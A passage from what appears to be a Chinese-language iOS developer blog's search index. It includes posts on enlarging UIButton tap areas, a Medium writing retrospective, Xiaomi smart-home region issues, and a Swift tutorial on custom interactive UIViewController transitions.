Class 指定為我們自訂的 MyButton，然後就能透過設定 touchEdgeInsets 針對個別 Button 擴大點擊範圍！ ️⚠️⚠️⚠️⚠️️️️⚠️️️️ 使用 Storyboard/xib 時記得設 Custom Class 為 MyButton ⚠️⚠️⚠️⚠️⚠️ touchEdgeInsets 以(0,0)自身為中心向外，所以上下左右的距離要用 負數 來延伸。看起來不錯…但是：對於每個 UIButton 都要置換成自訂的 MyButton 其實挺繁瑣的也增加程式的複雜性、甚至在大型專案中可能會有衝突。對於這種我們認為應該所有 UIButton 天生都應該要具有的功能，如果可以，我們希望能直接 Extension 擴充原本的 UIButton :private var buttonTouchEdgeInsets: UIEdgeInsets?extension UIButton { var touchEdgeInsets:UIEdgeInsets? { get { return objc_getAssociatedObject(self, &amp;buttonTouchEdgeInsets) as? UIEdgeInsets } set { objc_setAssociatedObject(self, &amp;buttonTouchEdgeInsets, newValue, .OBJC_ASSOCIATION_RETAIN_NONATOMIC) } } override open func point(inside point: CGPoint, with event: UIEvent?) -&gt; Bool { var frame = self.bounds if let touchEdgeInsets = self.touchEdgeInsets { frame = frame.inset(by: touchEdgeInsets) } return frame.contains(point); }}使用上如前述使用範例。因 Extension 不能包含 Property 否則會報編譯錯誤「Extensions must not contain stored properties」，這邊參考了 使用 Property 配合 Associated Object 將外部變數 buttonTouchEdgeInsets 關聯到我們的 Extension 上，就能如 Property 日常使用。(詳細原理請參考 貓大的文章 )UIImageView (UITapGestureRecognizer) 呢？針對圖片點擊、我們自己在 View 上加的 Tap 手勢；ㄧ樣能透過複寫 UIImageView 的 pointInside 達到同樣的效果。 完成！經過不斷的改進，在解決這個議題上更簡潔方便了不少！參考資料：UIView 改变触摸范围 (Objective-C)附記去年同一時間想開個小分類「 顧小事成大事 」紀錄一下日常開發瑣碎的小事，但這些小事默默累積又能成大事增加整個 APP 的不管是體驗或是程式方面；結果 拖了一年 才又增加了一篇文章 &lt;( _ _ )&gt;，小事真的很容易忘了記錄啊！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,015 Total Views Last Statistics Date: 2025-08-15 | 1,876 Views on Medium." }, { "title": "Medium 經營一年回顧", "url": "/posts/zrealm-life/medium-%E7%B6%93%E7%87%9F%E4%B8%80%E5%B9%B4%E5%9B%9E%E9%A1%A7-d01252331b53/", "categories": "ZRealm Life.", "tags": "medium, ios, life, writing-life, medium-taiwan", "date": "2020-01-12 23:49:30 +0800", "snippet": "Medium 經營一年回顧Medium 經營一年回顧的哩哩扣扣或是說 2019 年總結轉眼之間在 Medium 發表文章已經過了一年，實際上週年慶應該是 2019/10 (2018/10 第一篇)；但那時太忙了沒有靈感；眼看時間又向前邁入 2020 ，趕緊把經營一年的心得記錄一下、也當作是 2019 年總結吧！回顧在此先感謝 Enther Wu 及 Chih-Hung Yeh 的推坑，重新燃...", "content": "Medium 經營一年回顧Medium 經營一年回顧的哩哩扣扣或是說 2019 年總結轉眼之間在 Medium 發表文章已經過了一年，實際上週年慶應該是 2019/10 (2018/10 第一篇)；但那時太忙了沒有靈感；眼看時間又向前邁入 2020 ，趕緊把經營一年的心得記錄一下、也當作是 2019 年總結吧！回顧在此先感謝 Enther Wu 及 Chih-Hung Yeh 的推坑，重新燃起我的寫文魂；起初的文章比較像自己的日常或工作的心得筆記，內容較為空洞；不過依然很不要臉的貼到社群分享，現在回去看一開始的文章覺得有點糗，不知道在寫啥，內容含金量不高。不過一切都是成長的過程，越寫越有手感，在記錄的過程中研究的範疇越來越廣；因為怕誤人子弟、怕有遺漏的地方、怕是自己誤會；在這些壓力下，寫文章不只是記錄了，而是自己對某個問題的深入探索，更多的反而是自己的收穫成長；相對地與大家分享的內容質量也提高了不少。社群的大家真的很佛心，起初發文其實很怕被大家噴然後失去自信；但沒有，大家給的反饋都很正面，即使文章內容並不一定有幫助，也因為這股正面的鼓勵讓我在創作上更有信心，投入更多時間做紀錄；感謝大家的鼓勵！Medium 在寫作的體驗上真的很好，如果你也是程式開發者可以裝 Code Medium 這個 Chrome Extension，可以直接在 Medium 之中使用 Gist 貼上漂亮的程式碼！Publication &amp; Logo寫了生活又寫了技術，為了做區隔所幸建立了兩個 Publication 頻道： ZRealm Life. 分享生活、開箱 / ZRealm Dev. 分享工作、技術方面文章 ，讓大家可以依照自己想看的內容去追蹤。一個非常 ”西花“ 的東西 — 「LOGO」 ，生活要有儀式感？既然說是經營，那應該要有自己的品牌識別？於是我請了設計大大幫我把我的 Logo 構想製作出來；我的設計構想：外框五角形是致敬母校 台科大的校徽 ，五角代表板手代表技術工藝、內框 “ ZR ” 其實也沒變的意思就是我的英譯中文姓名 ZhongCheng 的首字 “ Z” 還有 Realm 我的地盤的 ”R” 。收穫要說收穫，先說寫文的初衷 — 「 教學相長 」，不是為了展示什麼、更不是為了賺錢；所有文章我都沒加入付費牆，知識不應該是要付費才能看的，知識本是力量； 如果喜歡可以多多支持 Medium 付費會員 ，這樣才能讓我們有較長遠的平台可以使用…(實在很怕它不堪虧損)要說收穫的話，除了金錢利益沒有，其他都有滿滿的收穫；第一是 成就感 ，文章有人看、有迴響就會很有成就感，更有動力繼續寫文；再來是認識了許多朋友產生更多的交流；我是屬於被動社交的人，在寫文章之前其實對社群是非常陌生的，幾乎沒有交流，現在認識許多朋友，覺得 在開發的路上並不孤單了！(如同我 Publication 的副標題 — 「解決問題的道路上你並不孤單」) 。統計既然說是回顧，那不免俗要統計一下數據。2019年(含2018年末)一共發表了：25 篇文章： 2 篇生活 + 5 篇開箱 + 18 篇技術文章累積約 60,000 次流量、 5,000 個拍手、突破 200 位追蹤者！表現比較好的文章有： iOS Deferred Deep Link 延遲深度連結實作(Swift) AirPods 2 開箱及上手體驗心得 如何打造一場有趣的工程CTF競賽 APP有用HTTPS傳輸，但資料還是被偷了。 Apple Watch Series 4 從入手到上手全方位心得 感謝大家的支持與愛護，今年也會繼續加油的！ 你的追蹤與回饋就是我寫作的原動力！ZhgChgLi, 2020/01/11.有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 268 Total Views Last Statistics Date: 2025-08-15 | 260 Views on Medium." }, { "title": "米家 APP / 小愛音箱地區問題", "url": "/posts/zrealm-life/%E7%B1%B3%E5%AE%B6-app-%E5%B0%8F%E6%84%9B%E9%9F%B3%E7%AE%B1%E5%9C%B0%E5%8D%80%E5%95%8F%E9%A1%8C-94a4020edb82/", "categories": "ZRealm Life.", "tags": "生活, 開箱, 小米空氣清淨機, ios, 小米", "date": "2020-01-12 22:04:14 +0800", "snippet": "米家 APP / 小愛音箱地區問題新添購小米空氣淨化器 3 &amp; 記錄下米家與小愛音箱的連動問題前言關於小米的第四篇；最近再加一新成員 — 「小米空氣淨化器 3」 老實說從未關心過房間的空氣品質，平常看室外空氣霧濛濛還是會怕怕的，再加上本身長期鼻子過敏，就下手買了一台放房間了！新一代在主機上就有小螢幕顯示濾網剩餘使用時間、當前空氣品質、選擇運行模式，不用連接 APP 就能使用；連接 A...", "content": "米家 APP / 小愛音箱地區問題新添購小米空氣淨化器 3 &amp; 記錄下米家與小愛音箱的連動問題前言關於小米的第四篇；最近再加一新成員 — 「小米空氣淨化器 3」 老實說從未關心過房間的空氣品質，平常看室外空氣霧濛濛還是會怕怕的，再加上本身長期鼻子過敏，就下手買了一台放房間了！新一代在主機上就有小螢幕顯示濾網剩餘使用時間、當前空氣品質、選擇運行模式，不用連接 APP 就能使用；連接 APP 的話就能遠端控制，但也沒其他特別的功能。買回來兩週了，發現房間空氣品質不錯；戶外空氣好時，室內空氣品質數值約在 001~006；室外空氣不好時，室內大約在 008~015；數值超過 75 才算空氣品質不好，150以上算嚴重；應該改買吸塵器比較實用ＸＤ不過有台空氣小尖兵守護家裡也是蠻不錯的。米家智慧家庭地區功能限制米家 APP 有分台灣跟中國兩個地區可以選擇；地區選擇會影響 APP 內的功能，當初設定的時候選了中國地區，想說選哪區其實資料都不安全，那不如選功能多的地區，可以玩更多功能。去年小愛音箱加入後，才注意到地區選擇有更複雜的問題；就是若要從小愛音箱控制米加智慧家電，兩個 APP 的地區必須選擇一樣，否則無法串接；這實在讓人苦惱，因為小愛音箱一樣如果選台灣，雖可搭配 KKBOX 但智慧功能是閹割版（少了小愛訓練）。因此我的小愛音箱原本的地區選擇也是設中國地區，之前買的家電再加入上沒碰到問題，最後也最後也無礙的建立好完整的智慧家庭流程：出門跟小愛說掰掰就會自動關閉所有電器+打開門口攝影機；回家則說到家了，一樣連動家電自動開啟；體驗起來蠻舒暢的！左:台灣/右:中國小米空氣淨化器 3的加入買了那麼多小米居家用品，新成員當然也要加入我的米家 APP！不過在加入的時候遇到問題，台灣版的小米空氣淨化器 3 無法加入我的米家 APP，要將米家 APP 地區切回台灣，才可….這下可麻煩了，唯獨空氣清淨機無法加入；怎麼試都無法，好像是配對方式台灣跟中國方式不一樣，無奈下只好將地區切回台灣，所有家電全部重設… 小愛音箱也改回台灣了。小愛音箱 + 米家智慧家庭場景控制因地區切回台灣，少了「小愛訓練」功能；無法直接在 APP 內設置詞彙執行對應的米家智慧家庭場景；再多方嘗試下，發現其實智慧家庭有連結授權米家 APP 的話，場景、家電還是會自動連動到小愛音箱授權控制！BUG我的場景「回家」小愛音箱能正確識別執行，但是「出門」卻一直無法識，嘗試了一個下午才發現是簡繁體問題；我把場景名稱換成「出门」，小愛音箱就能正常識別執行。 所以有場景無法執行問題的朋友不妨將場景名稱、裝置名稱改為簡體字。 完成！這樣就能在 APP 地區設定在台灣下，繼續照原本的體驗使用米加智慧家庭。延伸閱讀 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 （米家智慧攝影機及米家智慧檯燈、Homekit設定教學） 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） [進階篇]示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 6,599 Total Views Last Statistics Date: 2025-08-15 | 6,159 Views on Medium." }, { "title": "iOS UIViewController 轉場二三事", "url": "/posts/zrealm-dev/ios-uiviewcontroller-%E8%BD%89%E5%A0%B4%E4%BA%8C%E4%B8%89%E4%BA%8B-14cee137c565/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, swift, uiviewcontroller, mobile-app-development", "date": "2020-01-12 02:41:06 +0800", "snippet": "iOS UIViewController 轉場二三事UIViewController 下拉關閉/上拉出現/全頁右滑返回 效果全解前言一直以來都很好奇諸如 Facebook、Line、Spotify…等等常用的 APP 是如何實作「Present 的 UIViewController 可下拉關閉」、「上拉漸入 UIViewController」、「全頁面支援手勢右滑返回」這些效果的。因為這些效...", "content": "iOS UIViewController 轉場二三事UIViewController 下拉關閉/上拉出現/全頁右滑返回 效果全解前言一直以來都很好奇諸如 Facebook、Line、Spotify…等等常用的 APP 是如何實作「Present 的 UIViewController 可下拉關閉」、「上拉漸入 UIViewController」、「全頁面支援手勢右滑返回」這些效果的。因為這些效果內建都沒有，下拉關閉也直到 iOS ≥ 13 才有系統的卡片樣式支援。探索之路不知道是不會下關鍵字還是資料本身難找，一直找不到這類功能的實踐做法，找到的資料都很含糊零散，只能東拼西湊。一開始自己研究做法時找到 UIPresentationController 這個 API ，沒再深掘其他資料，就用這個方法搭配 UIPanGestureRecognizer 用很土炮的方式完成下拉關閉的效果；一直都覺得哪裡怪怪的，感覺會有更好的方式。直到最近接觸新專案拜讀 大大的文章 ，擴大眼界才發現有其他 API 更漂亮、更有彈性的做法可以用。 本篇一方面是自我紀錄，另一方面希望有幫助到跟我有一樣困惑的朋友。 內容有點多，嫌麻煩的可以直接拉到底看範例，或直接下載 Github 專案回來研究！iOS 13 卡片樣式呈現頁面首先講最新系統內建的效果iOS ≥ 13 後 UIViewController.present(_:animated:completion:) 默認的 modalPresentationStyle 效果就是 UIModalPresentationAutomatic 片樣式呈現頁面，若想要保持之前的全頁面呈現就要特別指定回 UIModalPresentationFullScreen 即可。內建行事曆新增效果如何取消下拉關閉？關閉確認？更好的使用者體驗應該要能在觸發下拉關閉時檢查有無輸入資料，有的話需要提示使用者是否捨棄動作離開。這部分蘋果也幫我們想好了，只需實作 UIAdaptivePresentationControllerDelegate 裡的方法即可。import UIKitclass DetailViewController: UIViewController { private var onEdit:Bool = true; override func viewDidLoad() { super.viewDidLoad() //設置代理 self.presentationController?.delegate = self //if uiviewcontroller embed in navigationController: //self.navigationController?.presentationController?.delegate = self //取消下拉關閉方式(1): self.isModalInPresentation = true; } }//代理實作extension DetailViewController: UIAdaptivePresentationControllerDelegate { //取消下拉關閉方式(2): func presentationControllerShouldDismiss(_ presentationController: UIPresentationController) -&gt; Bool { return false; } //下拉關閉取消時，下拉手勢觸發 func presentationControllerDidAttemptToDismiss(_ presentationController: UIPresentationController) { if (onEdit) { let alert = UIAlertController(title: \"資料尚未存儲\", message: nil, preferredStyle: .actionSheet) alert.addAction(UIAlertAction(title: \"捨棄離開\", style: .default) { _ in self.dismiss(animated: true) }) alert.addAction(UIAlertAction(title: \"繼續編輯\", style: .cancel, handler: nil)) self.present(alert, animated: true) } else { self.dismiss(animated: true, completion: nil) } }}取消下拉關閉可指定 UIViewController 的變數 isModalInPresentation 為 false 或實作 UIAdaptivePresentationControllerDelegate presentationControllerShouldDismiss 並回傳 true 擇一都可。UIAdaptivePresentationControllerDelegate presentationControllerDidAttemptToDismiss 這個方法只有在 下拉關閉取消時 才會呼叫使用。By the way…卡片樣式呈現頁面對系統來說就是 Sheet ，行為上跟 FullScreen 有所不同。 假設今天 RootViewController 是 HomeViewController 在卡片樣式呈現下 (UIModalPresentationAutomatic) 則： HomeViewController Present DetailViewController 時… HomeViewController 的 viewWillDisAppear / viewDidDisAppear 都不會觸發。 當 DetailViewController Dismiss 時… HomeViewController 的 viewWillAppear / viewDidAppear 都不會觸發。 ⚠️ 因 XCODE 11 之後版本打包的 iOS ≥ 13 APP 預設 Present 都會使用卡片樣式 (UIModalPresentationAutomatic) 如果之前有把一些邏輯放在 viewWillAppear/viewWillDisappear/viewDidAppear/viewDidDisappear 的要多加檢查注意！ ⚠️ 看完系統內建的，來看本篇重頭戲吧！如何自幹這些效果？哪裡可做轉場動畫？首先先整理哪裡可以做視窗切換轉場動畫。UITabBarController/UIViewController/UINavigationControllerUITabBarController 切換時我們可以在 UITabBarController 設定 delegate 然後實作 animationControllerForTransitionFrom 方法，就能在切換 UITabBarController 時對內容套用自訂轉場特效。系統預設無動畫，上方展示圖的是淡入淡出切換特效。import UIKitclass MainTabBarViewController: UITabBarController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self } }extension MainTabBarViewController: UITabBarControllerDelegate { func tabBarController(_ tabBarController: UITabBarController, animationControllerForTransitionFrom fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //return UIViewControllerAnimatedTransitioning }}UIViewController Present/Dismiss 時理所當然，在 Present/Dismiss UIViewController 時可以指定要套用的動畫效果，不然就不會有此篇文章了XD；不過值得一提的是，如果只是單純要做 Present 動畫沒有要做手勢控制，可以直接使用 UIPresentationController 方便快速 (詳見文末參考資料)。系統預設是上滑出現下滑消失！自己客製的話可以加入淡入、圓角、出現位置控制…等效果。import UIKitclass HomeAddViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() self.modalPresentationStyle = .custom self.transitioningDelegate = self } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Present時要套用的動畫 } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Dismiss時要套用的動畫 }} 任何 UIViewController 都能實作 transitioningDelegate 告知 Present/Dismiss 動畫； UITabBarViewController 、 UINavigationController 、 UITableViewController ….都可UINavigationController Push/Pop 時UINavigationController 大概是最不太需要會改動畫的，因為系統預設的左滑出現右滑返回動畫已經是最好的效果，能想得到要做這部分的客製可能可以用來做無縫 UIViewController 左右切換效果。因為我們要做全頁都可手勢返回，需要配合自訂 POP 動畫，所以需要自己實作一個返回動畫效果。import UIKitclass HomeNavigationController: UINavigationController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self }}extension HomeNavigationController: UINavigationControllerDelegate { func navigationController(_ navigationController: UINavigationController, animationControllerFor operation: UINavigationController.Operation, from fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { if operation == .pop { return //UIViewControllerAnimatedTransitioning 返回時要套用的動畫 } else if operation == .push { return //UIViewControllerAnimatedTransitioning push時要套用的動畫 } //回傳 nil 即走預設動畫 return nil }}交互非交互動畫？再講動畫實作、手勢控制前，先講一下何謂交互與非交互。交互動畫： 手勢觸發動畫，如 UIPanGestureRecognizer非交互動畫： 系統呼叫動畫，如 self.present( )怎麼實作動畫效果？講完哪裡可以做，再來看怎麼做動畫效果。我們需要實作 UIViewControllerAnimatedTransitioning 這個 Protocol 並在裡面對視窗做動畫。一般轉場動畫: UIView.animate直接使用 UIView.animate 做動畫處理，此時的 UIViewControllerAnimatedTransitioning 需要實作 transitionDuration 告知動畫時長、 animateTransition 實作動畫內容這兩個方法。import UIKitclass SlideFromLeftToRightTransition: NSObject, UIViewControllerAnimatedTransitioning { func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -&gt; TimeInterval { return 0.4 } func animateTransition(using transitionContext: UIViewControllerContextTransitioning) { //可用參數： //取得要展示的目標 UIViewController 的 View 內容: let toView = transitionContext.view(forKey: .to) //取得要展示的目標 UIViewController: let toViewController = transitionContext.viewController(forKey: .to) //取得要展示的目標 UIViewController 的 View 的初始化 Frame 資訊: let toInitalFrame = transitionContext.initialFrame(for: toViewController!) //取得要展示的目標 UIViewController 的 View 的最終 Frame 資訊: let toFinalFrame = transitionContext.finalFrame(for: toViewController!) //取得當前 UIViewController 的 View 內容: let fromView = transitionContext.view(forKey: .from) //取得當前 UIViewController: let fromViewController = transitionContext.viewController(forKey: .from) //取得當前 UIViewController 的 View 的初始化 Frame 資訊: let fromInitalFrame = transitionContext.initialFrame(for: fromViewController!) //取得當前 UIViewController 的 View 的最終 Frame 資訊: (在關閉動畫時可以取得之前顯示動畫時的最終Frame) let fromFinalFrame = transitionContext.finalFrame(for: fromViewController!) //toView.frame.origin.y = UIScreen.main.bounds.size.height UIView.animate(withDuration: transitionDuration(using: transitionContext), delay: 0, options: [.curveLinear], animations: { //toView.frame.origin.y = 0 }) { (_) in if (!transitionContext.transitionWasCancelled) { //動畫沒中斷 } // 告知系統動畫完成 transitionContext.completeTransition(!transitionContext.transitionWasCancelled) } } } To 跟 From: 假設今天 HomeViewController 要 Present/Push DetailViewController 時， From = HomeViewController / To = DetailViewController DetailViewController 要 Dismiss/Pop 時， From = DetailViewController / To = HomeViewController⚠️⚠️⚠️⚠️⚠️ 官方建議從 transitionContext.view 拿 View 使用，而不是從 transitionContext.viewController 拿 .view 使用。 但這邊有個問題，就是在做 Present/Dismiss 動畫時當 modalPresentationStyle = .custom ； Present 時使用 transitionContext.view(forKey: .from) 會是 nil 、 Dismiss 時使用 transitionContext.view(forKey: .to) 也會是 nil ； 還是需要從 viewController.view 拿值來用。⚠️⚠️⚠️⚠️⚠️ transitionContext.completeTransition(!transitionContext.transitionWasCancelled) 動畫完成必須呼叫，否則 畫面會卡死 ； 但因 UIView.animate 若無可執行動畫就不會 Call completion 造成前述方法未被呼叫；所以務必確保動畫是會執行的 (EX: y從100到0)。ℹ️ℹ️ℹ️ℹ️ℹ️ 參與動畫的 ToView/FromView ，若因 View 較為複雜或動畫時有些問題；可改用 snapshotView(afterScreenUpdates:) 截圖作為動畫展示，先截圖然後 transitionContext.containerView.addSubview(snapShotView) 上去圖層，接著隱藏原本的 ToView/FromView (isHidden = true) ，在動畫結束時在 snapShotView.removeFromSuperview() 和恢復顯示原本的 ToView/FromView (isHidden = true) 。可中斷、繼續的轉場動畫: UIViewPropertyAnimator另外也可以使用 iOS ≥ 10 新的動畫類別來實作動畫效果，看個人習慣或是動畫要做到多細節來做選擇，雖然官方的建議是有交互就使用 UIViewPropertyAnimator 但 不管是交互非交互(手勢控制) 一般都使用 UIView.animate 即可 ；UIViewPropertyAnimator 的轉場動畫能做到中斷繼續的效果，雖然我不知道實際能應用在哪，有興趣的朋友可參考 此篇文章 。import UIKitclass FadeInFadeOutTransition: NSObject, UIViewControllerAnimatedTransitioning { private var animatorForCurrentTransition: UIViewImplicitlyAnimating? func interruptibleAnimator(using transitionContext: UIViewControllerContextTransitioning) -&gt; UIViewImplicitlyAnimating { //當前有轉場動畫時直接返回 if let animatorForCurrentTransition = animatorForCurrentTransition { return animatorForCurrentTransition } //參數同前述 //fromView.frame.origin.y = 100 let animator = UIViewPropertyAnimator(duration: transitionDuration(using: transitionContext), curve: .linear) animator.addAnimations { //fromView.frame.origin.y = 0 } animator.addCompletion { (position) in transitionContext.completeTransition(!transitionContext.transitionWasCancelled) } //抓著動畫 self.animatorForCurrentTransition = animator return animator } func transitionDuration(using transitionContext: UIViewControllerContextTransitioning?) -&gt; TimeInterval { return 0.4 } func animateTransition(using transitionContext: UIViewControllerContextTransitioning) { //如果是非交互會走這，就讓它也走交互的動畫 let animator = self.interruptibleAnimator(using: transitionContext) animator.startAnimation() } func animationEnded(_ transitionCompleted: Bool) { //動畫完成，清空 self.animatorForCurrentTransition = nil } } 交互情況下 (後面講控制會細提)，會使用 interruptibleAnimator 方法的動畫；非交互的情況則還是使用 animateTransition 方法。 因為能繼續、中斷的特性；所以 interruptibleAnimator 是有可能會重複呼叫使用的；所以我們需要用一個全域變數做存取返回。Murmur… 其實我本來是想全都改用新的 UIViewPropertyAnimator 也想推薦大家都用新的來做，但我遇到一個很奇怪的問題，就是在做全頁手勢返回 Pop 動畫時，若手勢放開，動畫歸位，上方的 Navigation Bar 的 Item 會淡入淡出閃一下…找不到解，但回去用 UIView.animate 就沒這問題；如果有地方沒注意到歡迎跟我說&lt;( _ _ )&gt;。問題圖; + 按鈕是上一頁的所以保險起見還是用舊的方式吧！實際會依照不同的動畫效果建立個別的 Class，若覺得很檔案雜，可參考文末包好的方案；或是將同個連貫(Present+Dismii)動畫放在一起。transitionCoordinator另外如果需要更細緻的控制，例如 ViewController 裡面有某個元件需要配合轉場動畫改變；可在 UIViewController 中使用 transitionCoordinator 進行協作，這部分我沒用到；有興趣可參考 此篇文章 。怎麼控制動畫？這邊就是前述所說的「交互」，實際就是手勢控制；本篇最重要的章節，因為我們的要做的是手勢操作與轉場動畫的連動功能，才能達成我們要的下拉關閉、全頁返回功能。控制代理設置:同前面 ViewController 代理動畫設計，交互處理的類也需要在代理中告知 ViewController 。UITabBarController: 無 UINavigationController (Push/Pop):import UIKitclass HomeNavigationController: UINavigationController { override func viewDidLoad() { super.viewDidLoad() self.delegate = self }}extension HomeNavigationController: UINavigationControllerDelegate { func navigationController(_ navigationController: UINavigationController, animationControllerFor operation: UINavigationController.Operation, from fromVC: UIViewController, to toVC: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { if operation == .pop { return //UIViewControllerAnimatedTransitioning 返回時要套用的動畫 } else if operation == .push { return //UIViewControllerAnimatedTransitioning push時要套用的動畫 } //回傳 nil 即走預設動畫 return nil } //新增交互代理方法: func navigationController(_ navigationController: UINavigationController, interactionControllerFor animationController: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //這邊無法得知是Pop還是Push 只能從要做的動畫本身做判斷 if animationController is push時套用的動畫 { return //UIPercentDrivenInteractiveTransition push動畫的交互控制方法 } else if animationController is 返回時套用的動畫 { return //UIPercentDrivenInteractiveTransition pop動畫的交互控制方法 } //回傳 nil 即不做交互處理 return nil }}UIViewController (Present/Dismiss):import UIKitclass HomeAddViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() self.modalPresentationStyle = .custom self.transitioningDelegate = self } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func interactionControllerForDismissal(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //return nil 即不做交互處理 return //UIPercentDrivenInteractiveTransition Dismiss時交互控制方法 } func interactionControllerForPresentation(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //return nil 即不做交互處理 return //UIPercentDrivenInteractiveTransition Present時交互控制方法 } func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Present時要套用的動畫 } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { //回傳 nil 即走預設動畫 return //UIViewControllerAnimatedTransitioning Dismiss時要套用的動畫 } }⚠️⚠️⚠️⚠️⚠️ 有實作 interactionControllerFor … 這些方法，就算動畫是非交互(EX: self.present 系統呼叫轉場) 也會 Call 這些方法處理；我們需要控制的是裡面的 wantsInteractiveStart 參數(下面介紹)。動畫交互處理類 UIPercentDrivenInteractiveTransition:再來講核心要實作的 UIPercentDrivenInteractiveTransition 。import UIKitclass PullToDismissInteractive: UIPercentDrivenInteractiveTransition { //要加手勢控制交互的UIView private var interactiveView: UIView! //當前的UIViewController private var presented: UIViewController! //當托拉超過多少%後就完成執行，否則復原 private let thredhold: CGFloat = 0.4 //不同轉場效果可能需要不同資訊，可自訂 convenience init(_ presented: UIViewController, _ interactiveView: UIView) { self.init() self.interactiveView = interactiveView self.presented = presented setupPanGesture() //默認值，告知系統當前非交互動畫 wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 panGesture.delegate = self interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: //reset 手勢位置 sender.setTranslation(.zero, in: interactiveView) //告知系統當前開始的是手勢觸發的交互動畫 wantsInteractiveStart = true //在手勢began時呼叫要做的轉場效果(不會直接執行，系統會抓住) //然後轉場效果有設對應的動畫就會跳到 UIViewControllerAnimatedTransitioning 處理 // animated 一定為 true 否則沒動畫 //Dismiss: self.presented.dismiss(animated: true, completion: nil) //Present: //self.present(presenting,animated: true) //Push: //self.navigationController.push(presenting) //Pop: //self.navigationController.pop(animated: true) case .changed: //手勢滑動的位置計算 對應動畫完成百分比 0~1 //實際依動畫類型不同，計算方式不同 let translation = sender.translation(in: interactiveView) guard translation.y &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.y / interactiveView.bounds.height) //update UIViewControllerAnimatedTransitioning 動畫百分比 update(percentage) case .ended: //手勢放開完成時，看完成度有沒有超過 thredhold wantsInteractiveStart = false if percentComplete &gt;= thredhold { //有，告知動畫完成 finish() } else { //無，告知動畫歸位復原 cancel() } case .cancelled, .failed: //取消、錯誤時 wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}//當UIViewController內有UIScrollView元件(UITableView/UICollectionView/WKWebView....)，防止手勢衝突//當裡面的UIScrollView元件已滑到頂部，則啟用交互轉場的手勢操作extension PullToDismissInteractive: UIGestureRecognizerDelegate { func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -&gt; Bool { if let scrollView = otherGestureRecognizer.view as? UIScrollView { if scrollView.contentOffset.y &lt;= 0 { return true } else { return false } } return true } }*關於 sender.setTranslation( .zero, in:interactiveView) 原因的補充點我&lt;我們需要依據不同的手勢操作效果，實作不同的 Class；若是同個連貫(Present+Dismii)的操作也可包在一起。⚠️⚠️⚠️⚠️⚠️ wantsInteractiveStart 務必處於符合的狀態 ，若在交互動畫時告知 wantsInteractiveStart = false 也會造成卡畫面； 要退出重進 APP 才會恢復正。⚠️⚠️⚠️⚠️⚠️ interactiveView 也一定要是 isUserInteractionEnabled = true 哦 可以多加設置確保一下！組合當我們把這裡個 Delegate 設好、 Class 建好後就能做到我們想要的功能了。再來不囉唆，直接上完成範例。自製下拉關閉頁面效果自製下拉的好處在能支援市面所有 iOS 版本、可控制蓋板百分比、控制觸發關閉位置、客製化動畫效果。點右上方 + Present 頁面這是一個 HomeViewController Present HomeAddViewController 和 HomeAddViewController Dismiss的範例。import UIKitclass HomeViewController: UIViewController { @IBAction func addButtonTapped(_ sender: Any) { guard let homeAddViewController = UIStoryboard(name: \"Main\", bundle: nil).instantiateViewController(identifier: \"HomeAddViewController\") as? HomeAddViewController else { return } //transitioningDelegate 可指定目標ViewController處理或當前的ViewController處理 homeAddViewController.transitioningDelegate = homeAddViewController homeAddViewController.modalPresentationStyle = .custom self.present(homeAddViewController, animated: true, completion: nil) }}import UIKitclass HomeAddViewController: UIViewController { private var pullToDismissInteractive:PullToDismissInteractive! override func viewDidLoad() { super.viewDidLoad() //綁定轉場交互資訊 self.pullToDismissInteractive = PullToDismissInteractive(self, self.view) } }extension HomeAddViewController: UIViewControllerTransitioningDelegate { func interactionControllerForDismissal(using animator: 